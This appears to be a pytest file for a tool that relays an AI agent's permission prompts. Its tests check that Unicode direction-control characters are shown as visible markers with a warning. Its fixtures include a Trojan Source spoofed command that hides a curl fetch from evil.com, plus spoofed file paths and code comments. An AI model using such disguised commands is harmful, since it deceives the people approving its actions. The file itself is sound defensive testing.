"""Direction controls are shown, never obeyed, in what a person approves.

A permission prompt shows the real command or path. Unicode's direction
controls (U+202E and friends) change the order in which Telegram, a
browser or a phone draws the text after them, while the shell runs the
bytes in order: a command holding one could look like a different command
from the one that runs (Trojan Source, CVE-2021-42574). They are shown as
visible markers, with a warning on the prompt; every other character,
including the zero-width non-joiner inside ordinary Persian words, is left
exactly as it was.
"""

from __future__ import annotations

import json
import time
from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from aipager import bidi_guard
from aipager.bot.transport import _format_perm_detail
from aipager.dtach import hook_receiver as hr
from aipager.miniapp.sessions import session_summary
from aipager.state import SessionRegistry, Status, TrackedSession

RLO, PDF = "\u202e", "\u202c"
#: The bytes the shell runs; drawn as `echo cleanup done; curl | https://evil.com/script.sh`.
SPOOF = f"echo cleanup done; {RLO}hs.tpircs/moc.live//:sptth | lruc{PDF}"
SHOWN = "echo cleanup done; ⟨U+202E⟩hs.tpircs/moc.live//:sptth | lruc⟨U+202C⟩"

CONTROLS = ["\u202a", "\u202b", "\u202c", "\u202d", "\u202e",
            "\u2066", "\u2067", "\u2068", "\u2069", "\u200e", "\u200f", "\u061c"]
#: Not direction controls: ordinary text that must stay byte-identical.
UNTOUCHED = ["می\u200cخواهم",            # Persian word with a zero-width non-joiner
             "👩\u200d💻",               # emoji joined with a zero-width joiner
             "مرحبا بالعالم", "שלום", "日本語", "café",
             "a\u200bb", "\ufeffbom", "tab\there"]


# ---- the helper ----------------------------------------------------------------------

@pytest.mark.parametrize("char", CONTROLS)
def test_every_direction_control_is_shown_as_a_marker(char):
    shown = bidi_guard.reveal(f"ls {char}x")
    assert shown == f"ls ⟨U+{ord(char):04X}⟩x"
    assert bidi_guard.has_controls(f"ls {char}x") and bidi_guard.revealed(shown)


@pytest.mark.parametrize("text", UNTOUCHED)
def test_other_text_is_left_exactly_as_it_was(text):
    assert bidi_guard.reveal(text) == text
    assert not bidi_guard.has_controls(text) and not bidi_guard.revealed(text)


def test_only_markers_the_guard_wrote_count_as_revealed():
    assert not bidi_guard.revealed("echo ⟨U+0041⟩", "⟨U+202E", None, 5)
    assert bidi_guard.reveal(None) is None and bidi_guard.reveal(7) == 7


# ---- what the hook receiver builds --------------------------------------------------------

def test_the_summary_and_the_real_command_show_the_markers():
    inp = {"command": SPOOF, "description": "tidy up"}
    assert hr._tool_detail("Bash", inp) == SHOWN
    assert hr._summarize_tool("Bash", {"command": SPOOF}) == "Bash: " + SHOWN
    assert hr._summarize_tool("Bash", {"command": "x", "description": f"tidy {RLO}up"}) \
        == "Bash: tidy ⟨U+202E⟩up"
    assert hr._tool_detail("Write", {"file_path": f"/tmp/{RLO}txt.exe"}) == "/tmp/⟨U+202E⟩txt.exe"
    assert hr._summarize_tool("Edit", {"file_path": f"/a/{RLO}b"}) == "Edit: /a/⟨U+202E⟩b"


@pytest.mark.parametrize("text", UNTOUCHED)
def test_normal_commands_and_paths_are_unchanged(text):
    assert hr._tool_detail("Bash", {"command": f"echo {text}"}) == f"echo {text}"
    assert hr._summarize_tool("Read", {"file_path": f"/x/{text}"}) == f"Read: /x/{text}"


@pytest.fixture
def receiver():
    registry = SessionRegistry()
    notify_fn = AsyncMock()
    return registry, hr.HookReceiver(registry, notify_fn), notify_fn


def _send(recv, run_async, **fields):
    run_async(recv._on_datagram(json.dumps(fields).encode()))


def test_a_permission_request_shows_markers_but_keeps_the_real_input(receiver, run_async):
    _registry, recv, notify_fn = receiver
    raw = {"command": SPOOF, "description": "tidy up temp files"}
    _send(recv, run_async, hook_event_name="PermissionRequest", session="claude-jim",
          tool_name="Bash", tool_input=raw,
          permission_suggestions=[{"type": "addRules", "behavior": "allow",
                                   "rules": [{"toolName": "Bash", "ruleContent": "echo:*"}]}])
    _sess, event, ctx = notify_fn.await_args.args
    info = ctx["tool_info"]
    assert event == "permission_prompt"
    assert info["detail"] == SHOWN and RLO not in info["summary"]
    # What gets approved is untouched: the input, its digest, the rule offered.
    assert info["input"] == raw and info["input"]["command"] == SPOOF
    assert info["input_digest"] == hr._input_digest(raw)
    assert info["always_available"] is True


def test_a_question_shows_markers_in_its_text_and_options(receiver, run_async):
    _registry, recv, notify_fn = receiver
    question = {"question": f"Delete {RLO}tset{PDF}?", "header": f"h{RLO}",
                "options": [{"label": f"Yes {RLO}on", "description": f"d{RLO}"},
                            {"label": "No"}]}
    _send(recv, run_async, hook_event_name="PreToolUse", session="claude-jim",
          tool_name="AskUserQuestion", tool_input={"questions": [question]})
    _sess, _event, ctx = notify_fn.await_args.args
    q = ctx["tool_info"]["input"]["questions"][0]
    assert q["question"] == "Delete ⟨U+202E⟩tset⟨U+202C⟩?" and q["header"] == "h⟨U+202E⟩"
    assert [o["label"] for o in q["options"]] == ["Yes ⟨U+202E⟩on", "No"]
    assert q["options"][0]["description"] == "d⟨U+202E⟩"
    assert question["question"] == f"Delete {RLO}tset{PDF}?"   # the original is not changed


# ---- what the person sees -----------------------------------------------------------------

def test_the_detail_fragment_ends_with_a_warning_only_when_markers_are_there():
    assert _format_perm_detail("Bash: tidy up", SHOWN) == (
        f"\n<pre>{SHOWN}</pre>\n{bidi_guard.WARNING}")
    # the summary alone carried one: the warning still shows
    assert _format_perm_detail("Bash: tidy ⟨U+202E⟩up", "") == f"\n{bidi_guard.WARNING}"
    # normal input: byte-identical to before
    assert _format_perm_detail("Bash: List tmp", "ls -la /tmp") == "\n<pre>ls -la /tmp</pre>"
    assert _format_perm_detail("Bash: ls", "ls") == ""


def _waiting_sess():
    sess = TrackedSession(name="claude-jim", label="jim", status=Status.INTERACTIVE)
    sess.busy_msg_id = 42
    return sess


def _tool_info(raw):
    return {"name": "Bash", "input": raw, "always_available": False,
            "summary": hr._summarize_tool("Bash", raw), "detail": hr._tool_detail("Bash", raw)}


def test_the_busy_card_prompt_shows_the_markers_and_the_warning(mk_bot, run_async):
    bot = mk_bot()
    sess = _waiting_sess()
    bot._edit_busy_raw = AsyncMock(return_value=True)
    run_async(bot.notify(sess, "permission_prompt", {
        "tool_info": _tool_info({"command": SPOOF, "description": "tidy up temp files"})}))
    text = bot._build_busy_text("jim", "Waiting", sess)
    assert f"<pre>{SHOWN}</pre>" in text and bidi_guard.WARNING in text
    assert RLO not in text and PDF not in text


@pytest.mark.parametrize("raw", [{"command": SPOOF},
                                 {"command": "ls", "description": f"tidy {RLO}up"}])
def test_the_mini_app_shows_the_prompt_with_the_markers(mk_bot, run_async, raw):
    # The Mini App shows the prompt's one-line summary (Claude's description,
    # or the command when there is none).
    bot = mk_bot()
    sess = _waiting_sess()
    bot._edit_busy_raw = AsyncMock(return_value=True)
    run_async(bot.notify(sess, "permission_prompt", {"tool_info": _tool_info(raw)}))
    summary = session_summary(sess, time.monotonic())
    assert summary["waiting_kind"] == "permission"
    assert "⟨U+202E⟩" in summary["waiting_summary"]
    assert RLO not in json.dumps(summary, ensure_ascii=False)


def test_the_separate_prompt_message_shows_the_markers_and_the_warning(mk_bot, run_async):
    bot = mk_bot()
    sess = _waiting_sess()
    sess.busy_msg_id = None
    run_async(bot.notify(sess, "permission_prompt", {
        "tool_info": _tool_info({"command": SPOOF, "description": "tidy up temp files"})}))
    call = bot._app.bot.send_message.await_args
    text = call.args[1] if len(call.args) > 1 else call.kwargs["text"]
    assert f"<pre>{SHOWN}</pre>" in text and bidi_guard.WARNING in text and RLO not in text


def test_a_question_found_any_way_is_shown_with_markers(mk_bot, run_async):
    # The transcript fallback hands over the raw input: the handler cleans it too.
    bot = mk_bot()
    sess = _waiting_sess()
    bot._edit_busy_raw = AsyncMock(return_value=True)
    raw = {"questions": [{"question": f"Go {RLO}?", "options": [{"label": f"A{RLO}"}]}]}
    run_async(bot.notify(sess, "permission_prompt", {
        "tool_info": {"name": "AskUserQuestion", "input": raw, "summary": "q"}}))
    perm = sess.pending_permission
    assert perm["question"] == "Go ⟨U+202E⟩?" and perm["options"][0]["label"] == "A⟨U+202E⟩"
    text = bot._build_busy_text("jim", "Waiting", sess)
    assert RLO not in text and "Go ⟨U+202E⟩?" in text
    assert raw["questions"][0]["question"] == f"Go {RLO}?"


def test_the_audit_record_of_a_tap_carries_the_markers(mk_bot, run_async):
    bot = mk_bot()
    sess = TrackedSession(name="claude-dev", label="dev", status=Status.INTERACTIVE)
    info = _tool_info({"command": SPOOF})
    sess.pending_permission = {"tool_summary": info["summary"], "tool_info": info}
    bot.registry._sessions["claude-dev"] = sess
    query = MagicMock()
    query.data, query.answer, query.edit_message_text = "claude-dev:deny", AsyncMock(), AsyncMock()
    query.message = MagicMock(message_id=42, text="")
    query.message.chat.id = -100
    query.from_user = MagicMock(id=12345)
    update = MagicMock(callback_query=query, effective_user=query.from_user)
    update.effective_chat.id = -100
    records = []
    with patch("aipager.dtach.inject.send_keys", AsyncMock(return_value=True)), \
         patch("aipager.dtach.inject.is_alive", AsyncMock(return_value=True)), \
         patch("aipager.audit.append", side_effect=lambda **kw: records.append(kw) or True):
        run_async(bot._handle_callback(update, MagicMock()))
    assert records and all(RLO not in json.dumps(r, ensure_ascii=False) for r in records)
    assert any("⟨U+202E⟩" in str(r.get("summary")) for r in records)


# ---- aipager's own source holds none ------------------------------------------------------

def test_no_aipager_source_file_holds_a_raw_direction_control():
    # The same trick in a source file would make the code read differently
    # from what runs. Write such characters as escapes ("\u202e"), never raw.
    import pathlib
    root = pathlib.Path(__file__).resolve().parents[1]
    found = [f"{path.relative_to(root)}:{n}"
             for folder in ("aipager", "tests")
             for path in sorted((root / folder).rglob("*.py"))
             for n, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1)
             if bidi_guard.has_controls(line)]
    assert found == []


# ---- the diff preview, and a prompt saved by an older daemon -------------------------

def test_the_diff_preview_shows_the_markers_and_the_warning():
    from aipager.bot.transport import _build_diff_block
    header, body = _build_diff_block(
        "Write", {"file_path": f"/repo/{RLO}yp.evil", "content": f"ok = True  # {RLO}eurT = ko"})
    assert "/repo/⟨U+202E⟩yp.evil" in header and bidi_guard.WARNING in header
    assert "# ⟨U+202E⟩eurT = ko" in body and RLO not in header + body
    header, body = _build_diff_block(
        "Edit", {"file_path": "/repo/a.py", "old_string": "a = 1", "new_string": f"a = 2{PDF}"})
    assert bidi_guard.WARNING in header and "a = 2⟨U+202C⟩" in body


def test_a_normal_diff_preview_is_unchanged():
    from aipager.bot.transport import _build_diff_block
    header, body = _build_diff_block("Edit", {"file_path": "/repo/فایل.py",
                                              "old_string": "x = 1", "new_string": "x = 'می\u200cخواهم'"})
    assert header == "📝 <b>Edit</b> · <code>/repo/فایل.py</code>"
    assert body.splitlines()[-1] == "+x = 'می\u200cخواهم'"


def _old_record(kind, question=None):
    perm = {"tool_name": "AskUserQuestion" if question else "Bash",
            "tool_summary": f"Bash: tidy {RLO}up", "detail": SPOOF,
            "always_available": False, "standing_rule_suggestion": None,
            "hook_reply": None, "question": question}
    return {"kind": kind, "card_msg_id": 77, "msg_id": 88, "chat_id": -100,
            "text": f"🔐 <b>jim</b> · Permission needed\n<code>Bash: tidy {RLO}up</code>",
            "summary": f"Bash: tidy {RLO}up", "tool_use_id": "toolu_1",
            "shown_wall": time.time() - 5, "perm": perm}


def test_an_inline_prompt_saved_by_an_older_daemon_comes_back_with_markers(mk_bot):
    bot = mk_bot()
    sess = _waiting_sess()
    bot._rebuild_open_prompt(sess, _old_record("inline"), time.monotonic())
    perm = sess.pending_permission
    assert perm["tool_summary"] == "Bash: tidy ⟨U+202E⟩up"
    assert perm["tool_info"]["detail"] == SHOWN
    text = bot._build_busy_text("jim", "Waiting", sess)
    assert RLO not in text and bidi_guard.WARNING in text


def test_a_question_saved_by_an_older_daemon_comes_back_with_markers(mk_bot):
    bot = mk_bot()
    sess = _waiting_sess()
    question = {"question": f"Go {RLO}?", "options": [{"label": f"A{RLO}"}, {"label": "B"}]}
    bot._rebuild_open_prompt(sess, _old_record("inline", question), time.monotonic())
    perm = sess.pending_permission
    assert perm["question"] == "Go ⟨U+202E⟩?"
    assert [o["label"] for o in perm["options"]] == ["A⟨U+202E⟩", "B"]
    assert RLO not in json.dumps(perm["questions"], ensure_ascii=False)


def test_a_separate_prompt_saved_by_an_older_daemon_is_resent_with_markers(mk_bot):
    bot = mk_bot()
    sess = _waiting_sess()
    bot._rebuild_open_prompt(sess, _old_record("separate"), time.monotonic())
    msg = sess.pending_prompt_msg
    assert RLO not in msg["text"] and "⟨U+202E⟩" in msg["text"]
    assert msg["summary"] == "Bash: tidy ⟨U+202E⟩up"
    assert msg["perm"]["tool_summary"] == "Bash: tidy ⟨U+202E⟩up"
